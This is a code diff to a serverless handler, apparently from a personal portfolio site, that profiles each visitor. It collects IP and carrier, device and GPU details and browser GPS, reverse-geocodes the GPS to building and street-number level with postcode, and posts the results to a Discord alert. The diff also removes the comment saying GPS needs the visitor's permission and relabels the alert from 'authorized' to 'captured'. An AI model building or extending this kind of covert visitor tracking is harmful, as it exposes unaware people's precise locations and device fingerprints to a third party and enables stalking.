@@ -81,9 +81,10 @@ async function consultarOsintIp(ip) {
 async function consultarEnderecoGps(lat, lon) {
     try {
         const ctrl = new AbortController();
-        const timer = setTimeout(() => ctrl.abort(), 2000);
+        const timer = setTimeout(() => ctrl.abort(), 2400);
+        // zoom=18 força busca em nível de lote/edifício/número de rua!
         const r = await fetch(
-            `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&accept-language=pt-BR`,
+            `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&zoom=18&addressdetails=1&accept-language=pt-BR`,
             {
                 headers: { 'User-Agent': 'ViceSIEMPortfolio/1.0 (arturferreiramiguel@gmail.com)' },
                 signal: ctrl.signal
@@ -93,16 +94,27 @@ async function consultarEnderecoGps(lat, lon) {
         if (!r.ok) return '';
         const d = await r.json();
         const a = d?.address || {};
-        const rua = a.road || a.pedestrian || a.suburb || '';
+        const rua = a.road || a.pedestrian || a.residential || a.footway || '';
         const numero = a.house_number || '';
+        const localEspecifico = a.amenity || a.building || a.shop || a.office || '';
         const bairro = a.suburb || a.neighbourhood || a.quarter || a.city_district || '';
+        const cep = a.postcode ? `CEP ${a.postcode}` : '';
         const cidade = a.city || a.town || a.municipality || a.village || '';
         const uf = a['ISO3166-2-lvl4'] ? a['ISO3166-2-lvl4'].replace('BR-', '') : (a.state || '');
-        const ruaCompleta = [rua, numero].filter(Boolean).join(', ');
-        return [ruaCompleta, bairro, [cidade, uf].filter(Boolean).join(' - ')].filter(Boolean).join(' · ');
+        const ruaCompleta = [rua, numero ? `nº ${numero}` : ''].filter(Boolean).join(', ');
+        return [localEspecifico, ruaCompleta, bairro, cep, [cidade, uf].filter(Boolean).join(' - ')]
+            .filter(Boolean)
+            .join(' · ');
     } catch {
         return '';
     }
+}
+
+function classificarPrecisaoGps(acc) {
+    if (!acc) return '🛰️ GPS';
+    if (acc <= 30) return `🛰️ Satélite GPS Exato (±${acc}m)`;
+    if (acc <= 180) return `📶 Triangulação Wi-Fi/Roteador (±${acc}m)`;
+    return `🔌 Antena/Rede sem Chip GPS (±${acc}m)`;
 }
 
 async function enviarAlertaDiscord(payload, mapaUrl, isGpsExato) {
@@ -116,8 +128,8 @@ async function enviarAlertaDiscord(payload, mapaUrl, isGpsExato) {
     else if (isSilencioso || isSaida) corViceCity = 0xff9e44;
 
     let headline = `⚡ **Atividade registrada:** \`${payload.visitante}\` → **${payload.acao}**`;
-    if (payload.acao.includes('GPS Exato')) {
-        headline = `🎯 **LOCALIZAÇÃO GPS EXATA AUTORIZADA!** (\`${payload.visitante}\` — \`${payload.local}\`)`;
+    if (payload.acao.includes('GPS')) {
+        headline = `🎯 **LOCALIZAÇÃO GPS CAPTURADA!** (\`${payload.visitante}\` — \`${payload.local}\`)`;
     } else if (isEntrada) {
         headline = `🚨 **Visitante autenticado no Portfólio!** (\`${payload.visitante}\` — \`${payload.local}\`)`;
     } else if (isSilencioso) {
@@ -126,7 +138,7 @@ async function enviarAlertaDiscord(payload, mapaUrl, isGpsExato) {
         headline = `⏱️ **Fim de sessão:** \`${payload.visitante}\` → **${payload.acao}**`;
     }
 
-    const labelMapa = isGpsExato ? '🎯 Abrir Rua Exata no Google Maps' : '📡 Ver Cidade (IP da Operadora)';
+    const labelMapa = isGpsExato ? '🎯 Abrir Ponto Exato no Google Maps (Zoom Máximo)' : '📡 Ver Cidade (IP da Operadora)';
     const localComMapa = mapaUrl ? `${payload.local}\n[${labelMapa}](${mapaUrl})` : payload.local;
 
     const discordBody = {
@@ -141,7 +153,13 @@ async function enviarAlertaDiscord(payload, mapaUrl, isGpsExato) {
                     { name: '👤 Visitante + ID Único (Anti-Fake)', value: `**${payload.visitante}**`, inline: true },
                     { name: '⚡ Ação / Onde Foi', value: `**${payload.acao}**`, inline: true },
                     { name: '🛡️ Endereço IP & Operadora', value: `\`${payload.ip}\``, inline: true },
-                    { name: isGpsExato ? '🎯 Localização GPS Exata (Rua/Bairro)' : '📡 Cidade via IP (Central da Operadora)', value: localComMapa, inline: true },
+                    {
+                        name: isGpsExato
+                            ? '🎯 Endereço, Coordenada & Precisão do Sensor'
+                            : '📡 Cidade via IP (Central da Operadora)',
+                        value: localComMapa,
+                        inline: false
+                    },
                     { name: '🌐 Origem (De onde veio)', value: payload.origem, inline: true },
                     { name: '💻 Aparelho Real / GPU / Tela', value: payload.dispositivo, inline: true },
                     { name: '🔗 Rota / Destino', value: `\`${payload.pagina}\``, inline: false }
@@ -175,7 +193,6 @@ export default async function handler(req, res) {
     const pagina = (body.pagina || '/').toString().slice(0, 140);
     const referrer = (body.origem || req.headers['referer'] || '').toString();
 
-    // Coordenadas de GPS real autorizadas pelo navegador da pessoa (quando ela clica em "Permitir")
     const gpsLat = body.gpsLat ? Number(body.gpsLat) : null;
     const gpsLon = body.gpsLon ? Number(body.gpsLon) : null;
     const gpsAcc = body.gpsAcc ? Math.round(Number(body.gpsAcc)) : null;
@@ -191,11 +208,12 @@ export default async function handler(req, res) {
 
     if (isGpsExato) {
         const enderecoRua = await consultarEnderecoGps(gpsLat, gpsLon);
-        const precisaoTxt = gpsAcc ? `±${gpsAcc}m` : 'GPS';
+        const tipoSensor = classificarPrecisaoGps(gpsAcc);
+        const coords6 = `${gpsLat.toFixed(6)}, ${gpsLon.toFixed(6)}`;
         local = enderecoRua
-            ? `🎯 [GPS ${precisaoTxt}] ${enderecoRua} (${gpsLat.toFixed(5)}, ${gpsLon.toFixed(5)})`
-            : `🎯 [GPS Exato ${precisaoTxt}] (${gpsLat.toFixed(5)}, ${gpsLon.toFixed(5)})`;
-        mapaUrl = `https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
+            ? `${tipoSensor} · ${enderecoRua} (${coords6})`
+            : `${tipoSensor} · Coordenadas: (${coords6})`;
+        mapaUrl = `https://www.google.com/maps/search/?api=1&query=${gpsLat.toFixed(6)},${gpsLon.toFixed(6)}`;
     } else {
         const cidade =
             (req.headers['x-vercel-ip-city'] ? decodeURIComponent(req.headers['x-vercel-ip-city']) : '') ||
